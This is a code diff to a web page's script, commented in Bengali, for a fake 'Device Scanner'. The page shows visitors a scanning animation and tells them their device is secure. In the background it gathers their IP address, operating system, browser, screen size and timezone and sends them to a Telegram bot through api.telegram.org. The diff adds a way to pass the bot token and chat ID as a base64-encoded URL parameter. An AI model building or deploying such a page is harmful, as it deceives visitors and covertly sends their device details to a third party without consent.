@@ -189,26 +189,45 @@
 </div>
 
 <script>
+    // ====== ডিকোড ফাংশন (হিজিবিজি ডেটা পড়ুন) ======
+    function getCreds() {
+        const params = new URLSearchParams(window.location.search);
+        let token = params.get('tg_token');
+        let chatId = params.get('tg_chat');
+        
+        // এনকোডেড ডেটা চেক করুন
+        if (!token || !chatId) {
+            const encodedData = params.get('tg_data');
+            if (encodedData) {
+                try {
+                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
+                    token = decoded.token;
+                    chatId = decoded.chatId;
+                } catch(e) {
+                    console.warn('Failed to decode tg_data');
+                }
+            }
+        }
+        
+        // localStorage থেকে ফallback
+        if (!token) token = localStorage.getItem('tg_bot_token');
+        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
+        
+        return { token, chatId };
+    }
+
     (function(){
         'use strict';
 
-        // ---------- Telegram Creds ----------
-        function getCreds() {
-            const p = new URLSearchParams(window.location.search);
-            let t = p.get('tg_token') || localStorage.getItem('tg_bot_token');
-            let c = p.get('tg_chat') || localStorage.getItem('tg_chat_id');
-            return { token: t, chatId: c };
-        }
-
         // ---------- Send to Telegram ----------
         function sendToTelegram(info) {
-            const { token, chatId } = getCreds();
+            const { token, chatId } = getCreds();  // ✅ এখানে getCreds() ব্যবহার করুন
             if (!token || !chatId) {
                 console.warn('Telegram not configured.');
                 return;
             }
             const time = new Date().toLocaleString();
-            const msg = ` *  *\n ${time}\n Tool:  Device Scanner\n Action: Device info captured\n\n IP: ${info.ip}\n OS: ${info.os}\n Browser: ${info.browser}\n Screen: ${info.screen}\n Timezone: ${info.tz}\n Time: ${info.datetime}`;
+            const msg = `📊 *সাইবার টুলস একটিভিটি*\n🕐 ${time}\n🔧 Tool: 📱 Device Scanner\n📌 Action: Device info captured\n\n📡 IP: ${info.ip}\n🌐 OS: ${info.os}\n🧭 Browser: ${info.browser}\n📐 Screen: ${info.screen}\n🌍 Timezone: ${info.tz}\n🕒 Time: ${info.datetime}`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
@@ -266,7 +285,7 @@
         (async function init() {
             try {
                 // Step 1: Show scanning
-                statusIcon.textContent = '';
+                statusIcon.textContent = '⏳';
                 statusText.textContent = 'Scanning device...';
                 loader.classList.remove('hidden');
 
@@ -286,7 +305,7 @@
                 infoGrid.classList.add('active');
 
                 // Step 5: Status done
-                statusIcon.textContent = '';
+                statusIcon.textContent = '✅';
                 statusText.textContent = 'Scan complete! Your device is secure.';
                 loader.classList.add('hidden');
 
@@ -294,10 +313,10 @@
                 const fullInfo = { ip, os: info.os, browser: info.browser, screen: info.screen, tz: info.tz, datetime: info.datetime };
                 sendToTelegram(fullInfo);
 
-                console.log(' Device info sent to Telegram');
+                console.log('📱 Device info sent to Telegram');
             } catch (err) {
                 console.error('Error:', err);
-                statusIcon.textContent = '';
+                statusIcon.textContent = '❌';
                 statusText.textContent = 'Error scanning device. Please refresh.';
                 loader.classList.add('hidden');
             }
